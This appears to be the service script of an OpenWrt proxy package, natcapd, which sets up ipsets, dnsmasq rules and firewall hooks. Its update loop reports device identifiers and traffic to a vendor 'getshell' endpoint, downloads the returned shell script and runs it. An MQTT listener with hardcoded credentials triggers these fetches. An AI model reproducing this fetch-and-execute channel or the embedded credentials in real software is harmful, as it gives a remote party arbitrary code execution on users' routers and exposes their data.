#!/bin/sh

PID=$$
DEV=/dev/natcap_ctl

natcapd_stop()
{
	echo stop
	echo clean >>$DEV
	echo disabled=1 >>$DEV
	test -f /tmp/natcapd.firewall.sh && sh /tmp/natcapd.firewall.sh >/dev/null 2>&1
	rm -f /tmp/natcapd.firewall.sh
	test -f /tmp/dnsmasq.d/accelerated-domains.gfwlist.dnsmasq.conf && {
		rm -f /tmp/dnsmasq.d/accelerated-domains.gfwlist.dnsmasq.conf
		rm -f /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
		/etc/init.d/dnsmasq restart
	}
	rm -f /tmp/natcapd.running
	return 0
}

[ x$1 = xstop ] && natcapd_stop && exit 0

[ x$1 = xstart ] || {
	echo "usage: $0 start|stop"
	exit 0
}

b64encode() {
	cat - | base64 | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' | sed 's/ //g;s/=/_/g'
}

add_server () {
	if echo $1 | grep -q ':'; then
		echo server $1-$2 >>$DEV
	else
		echo server $1:0-$2 >>$DEV
	fi
}
add_udproxylist () {
	ipset -! add udproxylist $1
}
add_gfwlist () {
	ipset -! add gfwlist $1
}
add_knocklist () {
	ipset -! add knocklist $1
}
add_gfwlist_domain () {
	echo server=/$1/8.8.8.8 >>/tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	echo ipset=/$1/gfwlist >>/tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
}

enabled="`uci get natcapd.default.enabled 2>/dev/null`"
[ "x$enabled" = "x0" ] && natcapd_stop
[ "x$enabled" = "x1" ] && test -c $DEV && {
	echo disabled=0 >>$DEV
	touch /tmp/natcapd.running
	debug=`uci get natcapd.default.debug 2>/dev/null || echo 0`
	enable_encryption=`uci get natcapd.default.enable_encryption 2>/dev/null || echo 1`
	clear_dst_on_reload=`uci get natcapd.default.clear_dst_on_reload 2>/dev/null || echo 0`
	server_persist_timeout=`uci get natcapd.default.server_persist_timeout 2>/dev/null || echo 30`
	account=`uci get natcapd.default.account 2>/dev/null || echo ""`
	client_mac=`cat $DEV | grep default_mac_addr | grep -o "[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]"`
	uhash=`echo -n $client_mac$account | cksum | awk '{print $1}'`
	servers=`uci get natcapd.default.server 2>/dev/null`
	dns_server=`uci get natcapd.default.dns_server 2>/dev/null`
	udproxylist=`uci get natcapd.default.udproxylist 2>/dev/null`
	gfwlist_domain=`uci get natcapd.default.gfwlist_domain 2>/dev/null`
	gfwlist=`uci get natcapd.default.gfwlist 2>/dev/null`
	encode_mode=`uci get natcapd.default.encode_mode 2>/dev/null`
	shadowsocks=`uci get natcapd.default.shadowsocks 2>/dev/null || echo 0`
	sproxy=`uci get natcapd.default.sproxy 2>/dev/null || echo 0`
	enable_hosts=`uci get natcapd.default.enable_hosts 2>/dev/null || echo 0`
	test -n "$encode_mode" || encode_mode=TCP
	[ x$encode_mode = x0 ] && encode_mode=TCP
	[ x$encode_mode = x1 ] && encode_mode=UDP
	board_mac_addr=`lua /usr/share/natcapd/board_mac.lua`

	http_confusion=`uci get natcapd.default.http_confusion 2>/dev/null || echo 0`
	htp_confusion_host=`uci get natcapd.default.htp_confusion_host 2>/dev/null || echo bing.com`
	cnipwhitelist_mode=`uci get natcapd.default.cnipwhitelist_mode 2>/dev/null || echo 0`

	macfilter=`uci get natcapd.default.macfilter 2>/dev/null`
	maclist=`uci get natcapd.default.maclist 2>/dev/null`

	ipset -n list udproxylist >/dev/null 2>&1 || ipset -! create udproxylist iphash
	ipset -n list gfwlist >/dev/null 2>&1 || ipset -! create gfwlist iphash
	ipset -n list gfwhosts >/dev/null 2>&1 || ipset -! create gfwhosts iphash
	ipset -n list knocklist >/dev/null 2>&1 || ipset -! create knocklist iphash
	ipset -n list bypasslist >/dev/null 2>&1 || ipset -! create bypasslist iphash
	ipset -n list cniplist >/dev/null 2>&1 || {
		ipset -! create cniplist hash:net
		cat /usr/share/natcapd/cniplist.set | while read line; do ipset add cniplist $line; done
	}

	echo u_hash=$uhash >>$DEV
	echo debug=$debug >>$DEV
	echo clean >>$DEV
	echo server_persist_timeout=$server_persist_timeout >>$DEV
	echo encode_mode=$encode_mode >$DEV
	echo shadowsocks=$shadowsocks >$DEV
	echo sproxy=$sproxy >$DEV
	echo enable_hosts=$enable_hosts >$DEV
	test -n "$dns_server" && echo dns_server=$dns_server >$DEV
	test -n "$board_mac_addr" && echo default_mac_addr=$board_mac_addr >$DEV

	[ "x$clear_dst_on_reload" = x1 ] && ipset flush gfwlist

	echo http_confusion=$http_confusion >>$DEV
	echo htp_confusion_host=$htp_confusion_host >>$DEV
	echo cnipwhitelist_mode=$cnipwhitelist_mode >>$DEV

	test -n "$maclist" && {
		ipset -n list natcap_maclist >/dev/null 2>&1 || ipset -! create natcap_maclist machash
		ipset flush natcap_maclist
		for m in $maclist; do
			ipset -! add natcap_maclist $m
		done
	}

	if [ x"$macfilter" == xallow ]; then
		echo macfilter=1 >>$DEV
	elif [ x"$macfilter" == xdeny ]; then
		echo macfilter=2 >>$DEV
	else
		echo macfilter=0 >>$DEV
		ipset destroy natcap_maclist >/dev/null 2>&1
	fi

	opt="o"
	[ "x$enable_encryption" = x1 ] && opt='e'
	for server in $servers; do
		add_server $server $opt
		g=`echo $server | sed 's/:/ /' | awk '{print $1}'`
		add_knocklist $g
	done

	for u in $udproxylist; do
		add_udproxylist $u
	done
	for g in $gfwlist; do
		add_gfwlist $g
	done

	rm -f /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	mkdir -p /tmp/dnsmasq.d
	touch /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	for d in $gfwlist_domain; do
		add_gfwlist_domain $d
	done

	# reload firewall
	uci get firewall.natcapd >/dev/null 2>&1 || {
		uci -q batch <<-EOT
			delete firewall.natcapd
			set firewall.natcapd=include
			set firewall.natcapd.type=script
			set firewall.natcapd.path=/usr/share/natcapd/firewall.include
			set firewall.natcapd.family=any
			set firewall.natcapd.reload=0
			commit firewall
		EOT
	}
	touch /var/etc/shadowsocks.include
	/etc/init.d/firewall restart >/dev/null 2>&1 || echo /etc/init.d/firewall restart failed
	test -x /usr/sbin/mwan3 && /usr/sbin/mwan3 restart >/dev/null 2>&1

	#reload dnsmasq
	if test -p /tmp/trigger_gfwlist_update.fifo; then
		timeout -t5 sh -c 'echo >/tmp/trigger_gfwlist_update.fifo'
	fi

	#reload natcapd-client
	natcap_redirect_port=`uci get natcapd.default.natcap_redirect_port 2>/dev/null || echo 0`
	sleep 1 && killall natcapd-client >/dev/null 2>&1 && sleep 2
	echo natcap_redirect_port=$natcap_redirect_port >$DEV
	test $natcap_redirect_port -gt 0 && test $natcap_redirect_port -lt 65535 && {
		(
		/usr/sbin/natcapd-client -l$natcap_redirect_port >/dev/null 2>&1
		echo natcap_redirect_port=0 >/dev/natcap_ctl
		) &
	}
}

#reload pptpd
sh /usr/share/natcapd/natcapd.pptpd.sh

ACC=$1
ACC=`echo -n "$ACC" | b64encode`
CLI=`lua /usr/share/natcapd/board_mac.lua | sed 's/:/-/g' | tr a-z A-Z`
test -n "$CLI" || CLI=`cat $DEV | grep default_mac_addr | grep -o '[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]' | sed 's/:/-/g'`
test -n "$CLI" || CLI=`sed 's/:/-/g' /sys/class/net/eth0/address | tr a-z A-Z`

MOD=`cat /etc/board.json | grep model -A2 | grep id\": | sed 's/"/ /g' | awk '{print $3}'`

cd /tmp

_NAME=`basename $0`

LOCKDIR=/tmp/$_NAME.lck

cleanup () {
	if rm -f $LOCKDIR; then
		echo "Finished"
	else
		echo "Failed to remove lock directory '$LOCKDIR'"
		exit 1
	fi
}

nslookup_check () {
	local domain ipaddr
	domain=${1-www.baidu.com}
	ipaddr=`nslookup $domain 2>/dev/null | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
	test -n "$ipaddr" || {
		ipaddr=`nslookup $domain 114.114.114.114 2>/dev/null | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
		test -n "$ipaddr" || {
			ipaddr=`nslookup $domain 8.8.8.8 2>/dev/null | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
		}
	}
	echo "$ipaddr"
}

# mytimeout [Time] [cmd]
mytimeout() {
	local T=0
	while test -f $LOCKDIR/$PID; do
		if timeout -t30 $2 2>/dev/null; then
			return 0
		else
			T=$((T+30))
			if test $T -ge $1; then
				return 0
			fi
		fi
	done
	return 1
}

gfwlist_update_main () {
	test -f /tmp/natcapd.running && sh /usr/share/natcapd/gfwlist_update.sh
	while :; do
		test -f $LOCKDIR/$PID || exit 0
		test -p /tmp/trigger_gfwlist_update.fifo || { sleep 1 && continue; }
		mytimeout 86340 'cat /tmp/trigger_gfwlist_update.fifo' >/dev/null && {
			test -f /tmp/natcapd.running && sh /usr/share/natcapd/gfwlist_update.sh
		}
	done
}

natcapd_first_boot() {
	mkdir /tmp/natcapd.lck/watcher.lck >/dev/null 2>&1 || return
	local run=0
	while :; do
		ping -q -W3 -c1 114.114.114.114 >/dev/null 2>&1 || ping -q -W3 -c1 8.8.8.8 >/dev/null 2>&1 || {
			# restart ping after 8 secs
			sleep 8
			continue
		}
		[ x$run = x1 ] || {
			run=1
			test -p /tmp/trigger_natcapd_update.fifo && timeout -t5 sh -c 'echo >/tmp/trigger_natcapd_update.fifo'
			sleep 5
		}
		test -f /tmp/natcapd.lck/gfwlist || {
			test -p /tmp/trigger_gfwlist_update.fifo && timeout -t5 sh -c 'echo >/tmp/trigger_gfwlist_update.fifo'
			sleep 60
			continue
		}
		test -f /tmp/natcapd.lck/gfwhosts || {
			[ x`uci get natcapd.default.enable_hosts 2>/dev/null` = x1 ] && {
				test -p /tmp/trigger_gfwlist_update.fifo && timeout -t5 sh -c 'echo >/tmp/trigger_gfwlist_update.fifo'
				sleep 60
				continue
			}
		}
		break
	done
	rmdir /tmp/natcapd.lck/watcher.lck
}

txrx_vals() {
	test -f /tmp/natcapd.txrx || echo "0 0" >/tmp/natcapd.txrx
	cat /tmp/natcapd.txrx | while read tx1 rx1; do
		echo `cat $DEV  | grep flow_total_ | cut -d= -f2` | while read tx2 rx2; do
			tx=$((tx2-tx1))
			rx=$((rx2-rx1))
			if test $tx2 -lt $tx1 || test $rx2 -lt $rx1; then
				tx=$tx2
				rx=$rx2
			fi
			echo $tx $rx
			echo $tx2 $rx2 >/tmp/natcapd.txrx
			return 0
		done
	done
}

mqtt_cli() {
	while :; do
		test -f $LOCKDIR/$PID || exit 0
		mosquitto_sub -h router-sh.ptpt52.com -t "/gfw/device/$CLI" -u ptpt52 -P 153153 --quiet -k 180 | while read _line; do
			timeout -t5 sh -c 'echo >/tmp/trigger_natcapd_update.fifo'
		done
		sleep 60
		timeout -t5 sh -c 'echo >/tmp/trigger_natcapd_update.fifo'
	done
}

main_trigger() {
	local SEQ=0
	local hostip
	local built_in_server
	local need_revert=0
	. /etc/openwrt_release
	TAR=`echo $DISTRIB_TARGET | sed 's/\//-/g'`
	VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | b64encode`
	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
	while :; do
		test -f $LOCKDIR/$PID || exit 0
		test -p /tmp/trigger_natcapd_update.fifo || { sleep 1 && continue; }
		mytimeout 660 'cat /tmp/trigger_natcapd_update.fifo' >/dev/null && {
			rm -f /tmp/xx.sh
			rm -f /tmp/nohup.out
			IFACE=`ip r | grep default | grep -o 'dev .*' | cut -d" " -f2 | head -n1`
			LIP=""
			test -n "$IFACE" && LIP="`ifconfig $IFACE | grep 'inet addr:' | sed 's/:/ /' | awk '{print $3}'`"
			UP=`cat /proc/uptime | cut -d"." -f1`
			EXTRA=0
			if test -f /tmp/natcapd.extra.running; then
				EXTRA=1
				test -f /tmp/natcapd.extra.uptime && {
					while ! mkdir /tmp/natcapd.extra.lck 2>/dev/null; do sleep 1; done
					local lastup=`cat /tmp/natcapd.extra.uptime`
					if test $UP -gt $((lastup+120)); then
						EXTRA=0
					fi
					rmdir /tmp/natcapd.extra.lck
				}
			fi
			SRVS=`uci get natcapd.default.server`
			SRV=""
			test -n "$SRVS" && {
				for w in $SRVS; do
					SRV=`echo $w | cut -d":" -f1`
					break
				done
			}
			TXRX=`txrx_vals | b64encode`
			CV=`uci get natcapd.default.config_version 2>/dev/null`
			ACC=`uci get natcapd.default.account 2>/dev/null`
			hostip=`nslookup_check router-sh.ptpt52.com`
			built_in_server=`uci get natcapd.default._built_in_server`
			test -n "$built_in_server" || built_in_server=119.29.195.202
			test -n "$hostip" || hostip=$built_in_server
			URI="/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER&cv=$CV&tar=$TAR&mod=$MOD&txrx=$TXRX&seq=$SEQ&up=$UP&extra=$EXTRA&lip=$LIP&srv=$SRV"
			/usr/bin/wget --timeout=180 --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.sh \
				"https://router-sh.ptpt52.com$URI" || \
				/usr/bin/wget --timeout=60 --header="Host: router-sh.ptpt52.com" --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.sh \
					"https://$hostip$URI" || {
						/usr/bin/wget --timeout=60 --header="Host: router-sh.ptpt52.com" --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.sh \
							"https://$built_in_server$URI" || {
							#XXX disable dns proxy, becasue of bad connection
							uci set natcapd.default.dns_proxy_server=''
							uci set natcapd.default.dns_proxy_force='0'
							uci set natcapd.default.dns_proxy_force_tcp='0'
							/etc/init.d/natcapd restart
							uci revert natcapd
							need_revert=1
							continue
						}
					}
			[ "x$need_revert" = "x1" ] && {
				uci revert natcapd
				/etc/init.d/natcapd restart
				need_revert=0
			}
			head -n1 /tmp/xx.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
				chmod +x /tmp/xx.sh
				nohup /tmp/xx.sh &
			}
			SEQ=$((SEQ+1))
		}
	done
}

if mkdir $LOCKDIR >/dev/null 2>&1; then
	trap "cleanup" EXIT

	echo "Acquired lock, running"

	rm -f $LOCKDIR/*
	touch $LOCKDIR/$PID

	mkfifo /tmp/trigger_gfwlist_update.fifo 2>/dev/null
	mkfifo /tmp/trigger_natcapd_update.fifo 2>/dev/null

	gfwlist_update_main &
	main_trigger &
	natcapd_first_boot &

	mqtt_cli
else
	natcapd_first_boot &
	echo "Could not create lock directory '$LOCKDIR'"
	exit 0
fi
